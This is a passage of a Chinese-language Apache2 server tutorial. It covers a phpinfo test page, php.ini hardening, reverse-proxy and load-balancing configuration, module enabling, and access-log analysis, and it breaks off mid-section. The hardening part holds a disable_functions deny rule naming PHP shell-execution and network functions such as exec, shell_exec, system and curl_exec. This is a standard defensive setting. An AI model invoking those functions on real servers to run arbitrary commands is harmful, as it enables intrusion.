<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建测试文件</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;&lt;?php phpinfo(); ?>&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tee</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/info.php</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 访问测试</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://localhost/info.php</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安全起见，测试后删除</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> rm</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/info.php</span></span></code></pre></figure>
<p><strong>PHP安全配置：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 编辑php.ini</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/php/8.2/apache2/php.ini</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  # 版本号可能不同</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 推荐安全设置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">expose_php</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Off</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">display_errors</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Off</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">log_errors</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> On</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">error_log</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/php_errors.log</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">allow_url_fopen</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Off</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">allow_url_include</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Off</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">disable_functions</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">max_execution_time</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 30</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">max_input_time</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 60</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">memory_limit</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 128M</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">upload_max_filesize</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 10M</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">post_max_size</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 10M</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启生效</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<h3 id="4-代理模块反向代理">4. 代理模块（反向代理）<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4-代理模块反向代理" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用代理模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> proxy</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> proxy_http</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> proxy_balancer</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lbmethod_byrequests</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启Apache</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span></code></pre></figure>
<p><strong>反向代理配置示例：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *:80</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> proxy.example.com</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 代理到后端应用</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPreserveHost</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPass</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / http://localhost:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">3000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPassReverse</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / http://localhost:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">3000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 或代理到远程服务器</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ProxyPass / http://backend-server:8080/</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ProxyPassReverse / http://backend-server:8080/</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 负载均衡示例</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Proxy</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> balancer://mycluster</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        BalancerMember</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> http://backend1:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">8080</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        BalancerMember</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> http://backend2:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">8080</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        ProxySet lbmethod=byrequests</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Proxy</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPass</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / balancer://mycluster/</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ProxyPassReverse</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / balancer://mycluster/</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="5-其他有用模块">5. 其他有用模块<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#5-其他有用模块" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用压缩</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> deflate</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用缓存</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cache</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cache_disk</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> expires</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> headers</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用HTTP/2（需要SSL）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用速率限制</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ratelimit</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用用户目录</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> userdir</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看所有可用模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ls</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/mods-available/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看已启用模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -M</span></span></code></pre></figure>
<h2 id="七日志管理与监控">七、日志管理与监控<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#七日志管理与监控" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="1-日志文件说明">1. 日志文件说明<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-日志文件说明" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 主要日志文件</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">/var/log/apache2/access.log</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">     # 访问日志</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">/var/log/apache2/error.log</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">      # 错误日志</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">/var/log/apache2/other_vhosts_access.log</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  # 其他虚拟主机日志</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看日志</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tail</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tail</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/error.log</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看最近100行</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tail</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -n</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 100</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 搜索特定内容</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;404&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;error&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/error.log</span></span></code></pre></figure>
<h3 id="2-日志格式配置">2. 日志格式配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-日志格式配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在apache2.conf或虚拟主机配置中</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Common日志格式</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogFormat</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;%h %l %u %t \&quot;%r\&quot; %>s %b&quot; common</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Combined日志格式（推荐）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogFormat</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;%h %l %u %t \&quot;%r\&quot; %>s %b \&quot;%{</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">Referer</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}i\&quot; \&quot;%{</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">User-Agent</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}i\&quot;&quot; combined</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 自定义日志格式</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LogFormat</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;%h %l %u %t \&quot;%r\&quot; %>s %b \&quot;%{</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">Referer</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}i\&quot; \&quot;%{</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">User-Agent</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}i\&quot; %D %{</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">X-Forwarded-For</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}i&quot; custom</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用自定义格式</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">CustomLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/access.log custom</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 字段说明：</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %h - 客户端IP</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %l - 远程登录名</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %u - 认证用户名</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %t - 时间戳</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %r - 请求行</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %>s - 状态码</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %b - 响应大小</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %D - 请求处理时间（微秒）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %{Referer}i - 引荐页</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># %{User-Agent}i - 用户代理</span></span></code></pre></figure>
<h3 id="3-日志分析">3. 日志分析<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-日志分析" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 统计访问最多的IP</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> awk</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '{print $1}'</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sort</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> uniq</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -c</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sort</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -rn</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> head</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -20</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 统计请求的URL</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> awk</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '{print $7}'</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sort</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> uniq</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -c</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sort</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -rn</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> head</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -20</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 统计HTTP状态码</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> awk</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '{print $9}'</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/access.log</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sort</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> uniq</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -c</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sort</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -rn</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 统计User-Agent</span></span>
